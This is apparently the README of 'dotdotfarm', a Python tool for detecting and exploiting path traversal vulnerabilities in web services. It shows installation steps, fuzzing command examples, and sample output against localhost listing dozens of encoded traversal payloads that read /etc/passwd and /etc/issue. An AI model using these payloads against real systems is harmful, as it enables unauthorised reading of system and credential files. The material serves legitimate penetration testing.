dotdotfarm
==========
Utility for detection & exploitation of Path Traversal vulnerabilities in various network services

dotdotweb - PT tool for web services (HTTP, ~~WebSocket~~)

~~dotdotftp - PT tool for FTP services (FTP, TFTP, FTPS)~~

~~dotdotsmb - PT tool for SMB services~~

Tools are written in Python with using asyncio requests (aiohttp) with some acceleration techniques, which allows you to make **~3K requests per second**

Installation
============
```commandline
git clone https://github.com/treddis/dotdotfarm
cd dotdotfarm
python setup.py
```

Usage
=====
Passing in GET parameters
----------------------
Passing brute parameters via `?par=val` pairs:
```commandline
dotdotweb -o windows "http://someserver.com:1280/newpath?testparameter=FUZZ&secondparameter=somevalue"
```
Passing in headers
------------------
Passing brute parameters via "Header: value" pairs:
```commandline
dotdotweb -o linux -H "Referer: https://someserver.com/FUZZ" "https://somenewserver.org/nepath?query=val"
```
~~Passing via POST data~~
---------------------
Passing brute parameters via sending data in HTTP query:
```commandline
dotdotweb -o linux -d "key=value&file=FUZZ" https://testserver.com/checkupdates
```
You can also choose multiple brute parameters
```commandline
dotdotweb -o linux -d "key=FUZZ&file=FUZZ" -H "Referer: https://someserver.com/FUZZ" "http://someserver.com:1280/newpath?testparameter=FUZZ&secondparameter=somevalue"
```

Example output
==============
```commandline
dotdotweb -o linux "http://localhost:8080/pathtrav?query=FUZZ" 
[*] Started at Mon Jan 16 00:00:44 2023
http://localhost:8080/pathtrav?query=..%2f..%2fetc%2fpasswd                                          [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./%2e./etc/passwd                                  [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/etc/passwd                                        [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2fetc%2fpasswd                                      [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd                        [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./etc/passwd                                       [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../../../etc/passwd                                          [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2fetc%2fpasswd                               [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2f.%2e%2fetc%2fpasswd                        [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/etc/passwd                                       [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                          [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/etc/passwd                                 [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2fetc%2fpasswd                                  [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2fetc%2fpasswd                                      [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../etc/passwd                                                [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2fetc%2fpasswd                                     [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e./%2e./etc/passwd                                            [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2f..%2fetc%2fpasswd                                [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/.%2e/etc/passwd                                  [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e/.%2e/etc/passwd                                            [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd                               [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../../etc/passwd                                             [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                         [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../../etc/issue                                              [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=../../etc/issue                                                 [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=../../../../etc/issue                                           [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/etc/issue                                  [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/issue                           [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/.%2e/etc/issue                                   [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e/.%2e/etc/issue                                             [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./etc/issue                                        [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e./%2e./etc/issue                                             [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./%2e./etc/issue                                   [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/etc/issue                                        [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/etc/issue                                         [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2fetc%2fissue                                      [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=..%2f..%2fetc%2fissue                                           [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2f..%2fetc%2fissue                                 [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2fetc%2fissue                                       [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2fetc%2fissue                                [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2f.%2e%2fetc%2fissue                         [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2fetc%2fissue                                [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2fetc%2fissue                                       [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fissue                         [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2fetc%2fissue                                   [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue                          [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue                 [Status: 200, Size: 56]
[*] Ended at Mon Jan 16 00:00:54 2023 (9 seconds)
```